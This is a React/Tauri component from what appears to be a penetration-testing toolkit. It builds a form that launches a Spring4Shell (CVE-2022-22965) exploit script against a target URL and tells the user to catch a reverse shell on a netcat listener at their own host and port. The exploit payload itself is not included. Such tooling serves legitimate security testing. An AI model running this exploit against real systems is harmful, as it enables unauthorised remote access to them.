import { Button, LoadingOverlay, NativeSelect, NumberInput, Stack, TextInput, Title } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { Child, Command } from "@tauri-apps/api/shell";
import { IconDoorExit } from "@tabler/icons";

interface FormValues {
    hostIP: string;
    targetIP: string;
    hostPort: number;
}

export function CVE202222965() {
    const [loading, setLoading] = useState(false);
    const [handle, setHandle] = useState<Child | null>(null);
    const [output, setOutput] = useState("");
    const [target, setTarget] = useState<string | null>(null);
    const [listener, setListener] = useState<string | null>(null);

    let form = useForm({
        initialValues: {
            hostIP: "",
            targetIP: "",
            hostPort: 4444,
        },
    });

    const onSubmit = async (values: FormValues) => {
        setLoading(true);

        const args = [
            "/usr/share/ddt/spring4shell/spring4shell.py",

            `${values.targetIP}`,

            `${values.hostIP}`,

            `${values.hostPort}`,
        ];

        const command = new Command("python3", args);
        const newHandle = await command.spawn();

        setHandle(newHandle);

        const target = "Started Spring4Shell exploit on target URL...";
        const listener = "Check Netcat listener for reverse shell...";

        setTarget(target);
        setListener(listener);

        setLoading(false);
    };
    const killHandle = async () => {
        if (handle) {
            await handle.kill();
            setHandle(null);
            setTarget(null);
            setListener(null);
        }
    };
    const clearOutput = useCallback(() => {
        setOutput("");
    }, [setOutput]);

    const getOutput = () => {
        if (target && listener) {
            return `${target}\n\n${listener}`;
        } else {
            return "";
        }
    };
    return (
        <form onSubmit={form.onSubmit((values) => onSubmit({ ...values }))}>
            <LoadingOverlay visible={loading} />
            <Stack>
                <Title>Spring4Shell Exploit (CVE-2022-22965)</Title>
                <TextInput
                    label={"Host IP (your machine, for the reverse shell)"}
                    required
                    {...form.getInputProps("hostIP")}
                />

                <NumberInput
                    label={"Host port (Start your nectcat listener for reverse shell)"}
                    {...form.getInputProps("hostPort")}
                />
                <TextInput label={"Target URL"} required {...form.getInputProps("targetIP")} />

                <Button type={"submit"}>Exploit</Button>
                <ConsoleWrapper output={getOutput()} hideClearButton={true} />
                {handle && (
                    <Button leftIcon={<IconDoorExit />} onClick={killHandle} color={"red"}>
                        Kill process
                    </Button>
                )}
            </Stack>
        </form>
    );
}
export default CVE202222965;
